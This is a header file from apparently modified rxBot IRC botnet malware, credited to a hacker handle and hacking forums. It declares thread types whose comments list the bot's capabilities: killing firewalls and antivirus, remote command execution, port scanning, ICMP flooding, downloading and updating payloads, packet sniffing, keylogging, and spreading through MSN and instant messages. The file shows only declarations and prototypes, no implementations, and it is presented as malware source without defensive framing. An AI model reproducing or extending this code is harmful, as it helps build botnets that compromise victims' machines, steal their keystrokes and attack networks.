/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/

enum {
	MAIN_THREAD,		// Main thread 
	AUTOSTART_THREAD,	// AutoStart Thread
	KILLER_THREAD,		// Firewall/AV Killer thread 1
	KILLAV_THREAD,		// maybe this one 2
	IDENT_THREAD,		// Ident Server thread
	HTTP_THREAD,		// HTTP Server thread
	TFTP_THREAD,		// TFTP Server thread
	RCMD_THREAD,		// Remote CMD thread
	SCAN_THREAD,		// Port Scanner thread
	ICMP_THREAD,		// ICMP Flood thread
	PING_THREAD,		// Ping thread
	VISIT_THREAD,		// Visit URL thread
	DOWNLOAD_THREAD,	// Download thread
	UPDATE_THREAD,		// Update thread
	FTPTRANS_THREAD,	// FTP Transfer thread
	PSNIFF_THREAD,		// Psniff thread
	SECURE_THREAD,		// Secure thread
	KEYLOG_THREAD,		// Key Logger thread
	FIND_THREAD,		// File find thread
	LOG_THREAD,			// Log list thread
	PROC_THREAD,		// Process list thread 1
	PROCESS_THREAD,     // or this ? 2
	LIST_THREAD,		// Threads list thread	
	IMSPREAD_THREAD,
	MSN_THREAD,
	MSNMSG_THREAD,
	FIREFOX_THREAD

};

typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   SOCKET sock;
   SOCKET csock;
   HANDLE tHandle;
   char nick[MAXNICKLEN];

} THREAD;

// default new thread structure
typedef struct NTHREAD {
	void *conn;
	char target[128];
	int  threadnum;
	
	char *data1;
	char *data2;
	char *data3;

	BOOL bdata1;
	BOOL bdata2;
	BOOL bdata3;

	int idata1;
	int idata2;

	SOCKET sock;
	SOCKET csock;

	BOOL verbose;
	BOOL silent;
	BOOL gotinfo;

} NTHREAD;

typedef struct TLIST
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TLIST;


int addthread(char *name, int id, SOCKET sock);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);
